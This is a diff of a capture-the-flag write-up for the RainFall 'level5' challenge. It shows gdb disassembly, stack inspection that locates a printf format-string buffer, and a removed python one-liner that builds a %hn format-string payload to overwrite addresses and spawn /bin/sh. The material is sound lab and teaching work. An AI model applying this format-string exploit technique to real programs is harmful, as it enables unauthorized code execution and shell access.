@@ -36,7 +36,7 @@ Dump of assembler code for function o:
 	0x080484a5 <+1>:	mov    %esp,%ebp
 	0x080484a7 <+3>:	sub    $0x18,%esp
 	0x080484aa <+6>:	movl   $0x80485f0,(%esp)
-	0x080484b1 <+13>:	call   0x80483b0 <system@plt>
+	0x080484b1 <+13>:	call   0x80483b0 <system@plt> <== system("/bin/sh");
 	0x080484b6 <+18>:	movl   $0x1,(%esp)
 	0x080484bd <+25>:	call   0x8048390 <_exit@plt>
 End of assembler dump.
@@ -73,15 +73,17 @@ Starting program: /home/user/level5/level5 < <(python -c "print 'A'*4")
 Breakpoint 1, 0x080484f3 in n ()
 (gdb) x/8wx $esp
 0xbffff4e0:	0xbffff4f0	0x00000200	0xb7fd1ac0	0xb7ff37d0
+						^- beginning of printf arg list
+			^- address of format string passed to printf
 0xbffff4f0:	0x41414141	0xb7e2000a	0x00000001	0xb7fef305
+			^- beginning of buffer
 
-# The buffer is at $esp + 4 (words), once in the stack frame of printf.
-# Finally, the payload is as follows :
+# Therefore the first positional argument will be #4. We will construct the
+# payload in a similar fashion as the previous level
+# (see './Resources/payload.py' for the implementation).
+# Finally :
 
-level5@RainFall:~$ python -c "import struct;
-> thi = struct.pack('I', 0x804983a)
-> tlow = struct.pack('I', 0x8049838)
-> print thi + tlow + '%2044x' + '%4\$hn' + '%31904x' + '%5\$hn'" > /tmp/xd
+level5@RainFall:~$ python /tmp/payload.py > /tmp/xd
 level5@RainFall:~$ cat /tmp/xd - | ./level5
 ...
 whoami
